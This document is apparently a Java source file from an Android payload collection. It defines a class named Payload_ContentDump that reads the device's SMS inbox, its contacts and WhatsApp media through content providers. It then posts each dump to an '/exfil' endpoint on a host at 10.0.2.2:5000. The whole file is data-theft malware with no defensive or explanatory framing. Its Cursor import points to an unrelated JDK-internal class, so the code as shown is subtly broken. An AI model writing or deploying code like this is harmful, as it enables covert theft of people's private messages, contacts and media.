package payloads_source;

import android.net.Uri;
import jdk.internal.org.jline.terminal.Cursor;

public class Payload_ContentDump {
    public void execute(Context context) {
        String[] uris = {
            "content://sms/inbox",
            "content://com.android.contacts/contacts",
            "content://com.whatsapp.provider.media/item"
        };

        for (String uriStr : uris) {
            try {
                Uri uri = Uri.parse(uriStr);
                Cursor c = context.getContentResolver().query(uri, null, null, null, null);
                if (c != null) {
                    StringBuilder sb = new StringBuilder();
                    sb.append("[+] Dumping: ").append(uriStr).append("\n");

                    while (c.moveToNext()) {
                        for (int i = 0; i < c.getColumnCount(); i++) {
                            sb.append(c.getColumnName(i)).append(": ").append(c.getString(i)).append(" | ");
                        }
                        sb.append("\n");
                    }

                    postResult(sb.toString());
                    c.close();
                }
            } catch (Exception e) {
                postResult("[!] Failed: " + uriStr + " - " + e.getMessage());
            }
        }
    }

    private void postResult(String data) {
        try {
            java.net.URL url = new java.net.URL("https://10.0.2.2:5000/exfil");
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "text/plain");

            java.io.OutputStream os = conn.getOutputStream();
            java.io.OutputStreamWriter writer = new java.io.OutputStreamWriter(os, "UTF-8");
            writer.write(data);
            writer.flush(); writer.close(); os.close();
            conn.getResponseCode();
        } catch (Exception ex) { ex.printStackTrace(); }
    }
}
